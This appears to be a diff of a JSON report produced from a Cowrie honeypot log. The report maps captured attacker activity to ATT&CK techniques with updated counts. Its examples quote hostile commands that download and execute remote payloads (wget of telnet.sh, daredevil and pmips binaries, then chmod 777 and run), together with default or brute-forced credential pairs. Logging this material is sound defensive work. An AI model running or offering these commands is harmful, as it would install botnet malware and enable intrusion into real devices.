@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-23 19:00:12",
+  "generated": "2026-08-23 20:04:36",
   "totals": {
-    "commands": 660,
-    "login_failed": 1366,
-    "login_success": 76,
-    "sessions": 1774
+    "commands": 735,
+    "login_failed": 1412,
+    "login_success": 84,
+    "sessions": 1842
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1366,
+      "count": 1412,
       "examples": [
         "root / q1w2e3r4",
         "user / qwe123",
@@ -21,14 +21,14 @@
         "user / 150.136.155.47"
       ],
       "first": "2026-08-23T00:00:13.506843Z",
-      "last": "2026-08-23T18:59:53.937648Z",
-      "unique_ips": 75
+      "last": "2026-08-23T20:03:00.974747Z",
+      "unique_ips": 79
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 185,
+      "count": 197,
       "examples": [
         "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
         "http://176.65.139.202:80/telnet.sh",
@@ -37,14 +37,14 @@
         "http://176.65.139.202/daredevil.mips"
       ],
       "first": "2026-08-23T00:09:31.212472Z",
-      "last": "2026-08-23T16:18:59.266305Z",
-      "unique_ips": 17
+      "last": "2026-08-23T20:03:03.592632Z",
+      "unique_ips": 21
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 149,
+      "count": 180,
       "examples": [
         "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
         "#!/bin/sh\ncd /tmp || cd /var || cd /dev/shm || cd /\n\nrm -f daredevil.*\n\nwget http://176.65.139.202/daredevil.armv7l || c",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r"
       ],
       "first": "2026-08-23T00:09:31.212472Z",
-      "last": "2026-08-23T18:39:47.573771Z",
-      "unique_ips": 17
+      "last": "2026-08-23T20:03:02.613981Z",
+      "unique_ips": 20
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 76,
+      "count": 84,
       "examples": [
         "hikvision / hikvision",
         "bin / bin",
@@ -69,8 +69,8 @@
         "root / 123123"
       ],
       "first": "2026-08-23T00:09:30.963003Z",
-      "last": "2026-08-23T18:39:44.399314Z",
-      "unique_ips": 58
+      "last": "2026-08-23T20:03:01.869157Z",
+      "unique_ips": 62
     },
     {
       "id": "T1082",
@@ -92,15 +92,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 10,
+      "count": 12,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "id",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-23T00:31:56.572618Z",
-      "last": "2026-08-23T18:39:47.573771Z",
-      "unique_ips": 9
+      "last": "2026-08-23T19:13:29.256645Z",
+      "unique_ips": 11
     },
     {
       "id": "T1489",
@@ -246,63 +246,63 @@
   "unmapped": [
     [
       "/bin/busybox",
-      281
+      288
     ],
     [
       "shell",
-      18
+      21
     ],
     [
       "sh",
-      18
+      21
     ],
     [
       "system",
-      16
+      19
     ],
     [
       "enable",
-      15
+      18
     ],
     [
       "linuxshell",
-      12
+      14
     ],
     [
       "ping ;sh",
-      9
+      11
     ],
     [
       "cd /proc && cat self/cmdline",
-      9
+      11
     ],
     [
       "enablelinuxshell",
-      8
+      10
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      10
     ],
     [
       "busybox",
-      7
+      8
+    ],
+    [
+      "ping; sh",
+      4
     ],
     [
       "/bin/busybox jdwqXcb7",
       3
     ],
     [
-      "ping; sh",
+      "/bin/busybox STC",
       3
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      2
-    ],
-    [
-      "/bin/busybox STC",
-      2
-    ],
-    [
       "/bin/busybox hostname TOASTER",
-      2
+      3
     ],
     [
       "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
